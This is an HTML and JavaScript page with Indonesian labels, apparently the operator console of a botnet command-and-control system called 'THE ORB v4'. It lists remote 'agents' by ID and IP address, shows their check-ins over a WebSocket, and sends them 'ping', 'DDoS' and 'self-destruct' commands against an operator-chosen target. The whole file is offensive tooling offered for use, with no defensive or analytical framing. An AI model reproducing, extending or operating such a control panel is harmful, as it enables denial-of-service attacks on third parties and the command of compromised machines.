<!DOCTYPE html>
<html>
<head>
    <title>🌑 THE ORB v4</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; margin: 20px; }
        .panel { border: 1px solid #0f0; padding: 15px; margin: 10px 0; }
        .log { height: 200px; overflow-y: scroll; background: #111; }
        .btn { background: #0f0; color: #000; border: none; padding: 8px 12px; margin: 5px 0; width: 100%; }
        select, input { width: 100%; padding: 5px; margin: 5px 0; background: #333; color: #0f0; border: 1px solid #0f0; }
    </style>
</head>
<body>
    <h1>🌑 THE ORB v4 — FULL SYNC</h1>

    <div class="panel">
        <h2>🎯 Control Agent</h2>
        <select id="agentSelect"><option value="">Pilih Agent</option></select><br>
        <input type="text" id="targetInput" placeholder="Target (opsional)" /><br>
        <button class="btn" onclick="sendCommand('ping')">📡 Ping</button>
        <button class="btn" onclick="sendCommand('ddos')">💥 DDoS</button>
        <button class="btn" onclick="sendCommand('self-destruct')" style="background:#f00">🧯 Self-Destruct</button>
    </div>

    <div class="panel">
        <h2>📢 Log</h2>
        <div id="logs" class="log"></div>
    </div>

    <script>
        const logs = document.getElementById("logs");
        const ws = new WebSocket("ws://localhost:8000/ws");

        function addLog(text) {
            const p = document.createElement("p");
            p.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
            logs.appendChild(p);
            logs.scrollTop = logs.scrollHeight;
        }

        ws.onopen = () => addLog("🟢 Terhubung ke THE ORB");
        ws.onmessage = (e) => {
            const data = JSON.parse(e.data);
            if (data.type === "report") {
                addLog(`📡 ${data.data.agent_id} melapor`);
            }
        };

        // Update agent list
        setInterval(() => {
            fetch("/api/agents")
                .then(r => r.json())
                .then(data => {
                    const sel = document.getElementById("agentSelect");
                    sel.innerHTML = '<option value="">Pilih Agent</option>';
                    data.agents.forEach(a => {
                        const opt = document.createElement("option");
                        opt.value = a.agent_id;
                        opt.textContent = `${a.agent_id} (${a.ip})`;
                        sel.appendChild(opt);
                    });
                });
        }, 3000);

        function sendCommand(action) {
            const agent = document.getElementById("agentSelect").value;
            const target = document.getElementById("targetInput").value;
            if (!agent) return alert("Pilih agent!");
            fetch("/api/command", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ agent_id: agent, command: action, target: target })
            });
            addLog(`⚔️ ${action} → ${agent}`);
        }
    </script>
</body>
</html>
